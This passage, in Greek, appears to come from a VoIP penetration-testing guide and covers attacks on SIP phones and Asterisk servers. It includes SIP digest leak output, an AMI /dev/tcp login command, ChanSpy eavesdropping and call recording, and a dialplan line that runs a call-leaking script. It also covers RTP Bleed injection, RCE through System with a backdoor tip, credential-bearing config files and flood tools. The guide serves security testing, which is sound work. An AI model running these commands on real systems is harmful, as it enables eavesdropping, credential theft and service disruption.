4. Όταν το τηλέφωνο κλείνεται, το **τηλέφωνο θύμα στέλνει ένα BYE στον εισβολέα**
5. Ο **εισβολέας εκδίδει μια απάντηση 407** που **ζητά πιστοποίηση** και εκδίδει μια πρόκληση πιστοποίησης
6. Το **τηλέφωνο θύμα παρέχει μια απάντηση στην πρόκληση πιστοποίησης** σε ένα δεύτερο BYE
7. Ο **εισβολέας μπορεί στη συνέχεια να εκδώσει μια επίθεση βίας** στην απάντηση πρόκλησης στον τοπικό του υπολογιστή (ή κατανεμημένο δίκτυο κλπ) και να μαντέψει τον κωδικό πρόσβασης

* **Διαρροή SIPPTS** από [**sippts**](https://github.com/Pepelux/sippts)**:** Η διαρροή SIPPTS εκμεταλλεύεται την ευπάθεια διαρροής του SIP Digest που επηρεάζει ένα μεγάλο αριθμό των SIP τηλεφώνων. Το αποτέλεσμα μπορεί να αποθηκευτεί σε μορφή SipCrack για να εκτελεστεί με brute force χρησιμοποιώντας το SIPPTS dcrack ή το εργαλείο SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Το Click2Call επιτρέπει σε έναν **χρήστη ιστοσελίδας** (που για παράδειγμα ενδιαφέρεται για ένα προϊόν) να **εισάγει** τον **αριθμό τηλεφώνου του** για να του κληθεί. Στη συνέχεια θα γίνει ένα τηλεφώνημα σε έναν εμπορικό, και όταν **σηκώσει το τηλέφωνο** ο χρήστης θα **κληθεί και θα συνδεθεί με τον πράκτορα**.

Ένα κοινό προφίλ Asterisk γι' αυτό είναι:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Το προηγούμενο προφίλ επιτρέπει **ΟΠΟΙΑΔΗΠΟΤΕ διεύθυνση IP να συνδεθεί** (αν είναι γνωστός ο κωδικός).
* Για να **οργανώσετε μια κλήση**, όπως προαναφέρθηκε, **δεν απαιτείται άδεια ανάγνωσης** και **μόνο** η **δυνατότητα originate** στο **write** είναι απαραίτητη.

Με αυτές τις άδειες, οποιαδήποτε διεύθυνση IP που γνωρίζει τον κωδικό θα μπορούσε να συνδεθεί και να εξάγει πάρα πολλές πληροφορίες, όπως:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Περισσότερες πληροφορίες ή ενέργειες μπορεί να ζητηθούν.**

### **Ακροάσεις**

Στο Asterisk είναι δυνατή η χρήση της εντολής **`ChanSpy`** δείχνοντας τις **επεκτάσεις προς παρακολούθηση** (ή όλες τις επεκτάσεις) για να ακούσετε συνομιλίες που γίνονται. Αυτή η εντολή πρέπει να ανατεθεί σε μια επέκταση.

Για παράδειγμα, **`exten => 333,1,ChanSpy('all',qb)`** υποδηλώνει ότι αν **καλέσετε** την **επέκταση 333**, θα **παρακολουθήσει** **`όλες`** τις επεκτάσεις, θα **ξεκινήσει να ακούει** όποτε μια νέα συνομιλία ξεκινάει (**`b`**) σε ήσυχη λειτουργία (**`q`**) καθώς δεν θέλουμε να αλληλεπιδράσουμε με αυτήν. Μπορείτε να πηγαίνετε από μια συνομιλία που συμβαίνει σε μια άλλη πατώντας **`*`**, ή σημειώνοντας τον αριθμό της επέκτασης.

Είναι επίσης δυνατό να χρησιμοποιήσετε το **`ExtenSpy`** για την παρακολούθηση μιας επέκτασης μόνο.

Αντί να ακούτε τις συνομιλίες, είναι δυνατό να τις **καταγράψετε σε αρχεία** χρησιμοποιώντας μια επέκταση όπως:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Οι κλήσεις θα αποθηκεύονται στο **`/tmp`**.

Μπορείτε ακόμα να κάνετε το Asterisk **να εκτελέσει ένα σενάριο που θα διαρρεύσει την κλήση** όταν κλείσει.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Ευπαθότητα RTCPBleed

Το **RTCPBleed** είναι ένα σημαντικό θέμα ασφάλειας που επηρεάζει τους διακομιστές VoIP βασισμένους σε Asterisk (δημοσιεύθηκε το 2017). Η ευπαθότητα επιτρέπει στην κυκλοφορία **RTP (Real Time Protocol)**, η οποία μεταφέρει τις συνομιλίες VoIP, να **διακοπεί και να ανακατευθυνθεί από οποιονδήποτε στο Διαδίκτυο**. Αυτό συμβαίνει επειδή η κυκλοφορία RTP παρακάμπτει την ταυτοποίηση κατά τη διέλευση μέσω των τειχών προστασίας NAT (Network Address Translation).

Οι διαμεσολαβητές RTP προσπαθούν να αντιμετωπίσουν τα **όρια του NAT** που επηρεάζουν τα συστήματα RTC με τον διαμεσολαβητή RTP να δρομολογεί ροές RTP μεταξύ δύο ή περισσότερων μερών. Όταν υπάρχει NAT, το λογισμικό διαμεσολαβητής RTP συχνά δεν μπορεί να βασιστεί στις πληροφορίες IP και θύρας RTP που ανακτώνται μέσω σήμανσης (π.χ. SIP). Συνεπώς, πολλοί διαμεσολαβητές RTP έχουν εφαρμόσει ένα μηχανισμό όπου το συγκεκριμένο **IP και θύρα αυτόματα μαθαίνεται**. Συνήθως γίνεται αυτό ελέγχοντας την εισερχόμενη κυκλοφορία RTP και επισημαίνοντας την πηγή IP και θύρα για οποιαδήποτε εισερχόμενη κυκλοφορία RTP ως αυτή που πρέπει να απαντηθεί. Αυτός ο μηχανισμός, που μπορεί να ονομαστεί "λειτουργία μάθησης", **δεν χρησιμοποιεί καμία μορφή ταυτοποίησης**. Συνεπώς, οι **επιτιθέμενοι** μπορούν να **στείλουν κυκλοφορία RTP στον διαμεσολαβητή RTP** και να λάβουν την διαμεσολαβημένη κυκλοφορία RTP που προορίζεται για τον καλούντα ή τον καλούμενο μιας ενεργής ροής RTP. Αυτή η ευπαθότητα ονομάζεται RTP Bleed επειδή επιτρέπει στους επιτιθέμενους να λαμβάνουν ροές μέσων RTP που προορίζονται για νόμιμους χρήστες.

Ένα άλλο ενδιαφέρον συμπεριφοράς των διαμεσολαβητών RTP και των στοιβών RTP είναι ότι μερικές φορές, **ακόμα κι αν δεν είναι ευάλωτοι στο RTP Bleed**, θα **αποδεχτούν, θα προωθήσουν και/ή θα επεξεργαστούν πακέτα RTP από οποιαδήποτε πηγή**. Συνεπώς, οι επιτιθέμενοι μπορούν να στείλουν πακέτα RTP τα οποία μπορεί να τους επιτρέψουν να ενσωματώσουν τα μέσα τους αντί των νόμιμων. Αυτή η επίθεση ονομάζεται ενσωμάτωση RTP επειδή επιτρέπει την ενσωμάτωση παράνομων πακέτων RTP σε υπάρχουσες ροές RTP. Αυτή η ευπαθότητα μπορεί να βρεθεί τόσο σε διαμεσολαβητές RTP όσο και σε σημεία άκρης.

Το Asterisk και το FreePBX έχουν χρησιμοποιήσει παραδοσιακά τη ρύθμιση **`NAT=yes`**, η οποία ενεργοποιεί την παράκαμψη της ταυτοποίησης της κυκλοφορίας RTP, με πιθανό αποτέλεσμα να μην υπάρχει ή να υπάρχει μονόδρομη κυκλοφορία ήχου στις κλήσεις.

Για περισσότερες πληροφορίες ελέγξτε το [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS rtpbleed ανιχνεύει την ευπαθότητα RTP Bleed αποστέλλοντας ροές RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS rtcpbleed ανιχνεύει την ευπάθεια RTP Bleed αποστέλλοντας ροές RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS rtpbleedflood εκμεταλλεύεται την ευπάθεια RTP Bleed αποστέλλοντας ροές RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS rtpbleedinject εκμεταλλεύεται την ευπάθεια RTP Bleed ενθέτοντας ένα αρχείο ήχου (μορφή WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Στο Asterisk καταφέρνετε κάπως να μπορείτε να **προσθέσετε κανόνες επέκτασης και να τους επαναφορτώσετε** (για παράδειγμα με την εκμετάλλευση ενός ευάλωτου διακομιστή διαχείρισης ιστού), είναι δυνατή η λήψη RCE χρησιμοποιώντας την εντολή **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Υπάρχει η εντολή με το όνομα **`Shell`** που μπορεί να χρησιμοποιηθεί **αντί για την `System`** για την εκτέλεση εντολών συστήματος αν χρειαστεί.

{% hint style="warning" %}
Αν ο διακομιστής απαγορεύει τη χρήση ορισμένων χαρακτήρων στην εντολή **`System`** (όπως στο Elastix), ελέγξτε αν ο web server επιτρέπει τη **δημιουργία αρχείων κάπως μέσα στο σύστημα** (όπως στο Elastix ή trixbox) και χρησιμοποιήστε το για **δημιουργία ενός backdoor script** και στη συνέχεια χρησιμοποιήστε την **`System`** για να **εκτελέσετε** αυτό το **script**.
{% endhint %}

#### Ενδιαφέροντα τοπικά αρχεία και δικαιώματα

* **`sip.conf`** -> Περιέχει τον κωδικό πρόσβασης των χρηστών SIP.
* Αν ο **διακομιστής Asterisk τρέχει ως ροοτ**, μπορείτε να διακινδυνεύσετε τον root
* Ο **mysql root χρήστης** μπορεί να **μην έχει κωδικό πρόσβασης**.
* Αυτό μπορεί να χρησιμοποιηθεί για τη δημιουργία ενός νέου χρήστη mysql ως backdoor
* **`FreePBX`**
* **`amportal.conf`** -> Περιέχει τον κωδικό πρόσβασης του διαχειριστή του web panel (FreePBX)
* **`FreePBX.conf`** -> Περιέχει τον κωδικό πρόσβασης του χρήστη FreePBXuser που χρησιμοποιείται για πρόσβαση στη βάση δεδομένων
* Αυτό μπορεί να χρησιμοποιηθεί για τη δημιουργία ενός νέου χρήστη mysql ως backdoor
* **`Elastix`**
* **`Elastix.conf`** -> Περιέχει αρκετούς κωδικούς σε καθαρό κείμενο όπως ο κωδικός ρίζας του mysql, ο κωδικός IMAPd, ο κωδικός διαχειριστή του web
* **Πολλοί φάκελοι** θα ανήκουν στον χρήστη asterisk που έχει διακινδυνευμένο (αν δεν τρέχει ως ροοτ). Αυτός ο χρήστης μπορεί να διαβάσει τα προηγούμενα αρχεία και επίσης ελέγχει τη διαμόρφωση, οπότε μπορεί να κάνει τον Asterisk να φορτώσει άλλα backdoored δυαδικά όταν εκτελείται.

### RTP Εισαγωγή

Είναι δυνατόν να εισαχθεί ένα **`.wav`** σε συνομιλίες χρησιμοποιώντας εργαλεία όπως το **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) και το **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ή μπορείτε να χρησιμοποιήσετε τα scripts από [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) για να **σαρώσετε συνομιλίες** (**`rtpscan.pl`**), να στείλετε ένα `.wav` σε μια συνομιλία (**`rtpsend.pl`**) και να **εισάγετε θόρυβο** σε μια συνομιλία (**`rtpflood.pl`**).

### DoS

Υπάρχουν αρκετοί τρόποι για να προσπαθήσετε να προκαλέσετε DoS σε διακομιστές VoIP.

* **`SIPPTS flood`** από [**sippts**](https://github.com/Pepelux/sippts)**: Το SIPPTS flood στέλνει απεριόριστα μηνύματα στον στόχο.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** από [**sippts**](https://github.com/Pepelux/sippts)**: Το SIPPTS ping κάνει ένα SIP ping για να δει τον χρόνο απόκρισης του διακομιστή.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS πρωτόκολλο IAX που χρησιμοποιείται από το Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Ένα εργαλείο για την πραγματοποίηση πλημμύρας μηνυμάτων SIP/SDP INVITE μέσω UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Αποστολή αρκετών καλά δομημένων πακέτων RTP. Χρειάζεται να γνωρίζετε τις θύρες RTP που χρησιμοποιούνται (κάντε πρώτα sniff).
* [**SIPp**](https://github.com/SIPp/sipp): Επιτρέπει την ανάλυση και τη δημιουργία κίνησης SIP. Έτσι μπορεί να χρησιμοποιηθεί και για DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Εργαλείο πολυεργαλείο SIP. Μπορεί επίσης να χρησιμοποιηθεί για επιθέσεις SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Ευπάθειες λειτουργικού συστήματος

Ο πιο εύκολος τρόπος να εγκαταστήσετε ένα λογισμικό όπως το Asterisk είναι να κατεβάσετε μια **διανομή λειτουργικού συστήματος** που το έχει ήδη εγκατεστημένο, όπως: **FreePBX, Elastix, Trixbox**... Το πρόβλημα με αυτά είναι ότι μόλις αρχίσουν να λειτουργούν οι συστημικοί διαχειριστές μπορεί να **μην τα ενημερώσουν ξανά** και οι **ευπάθειες** θα ανακαλυφθούν με τον χρόνο.

## Αναφορές

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)
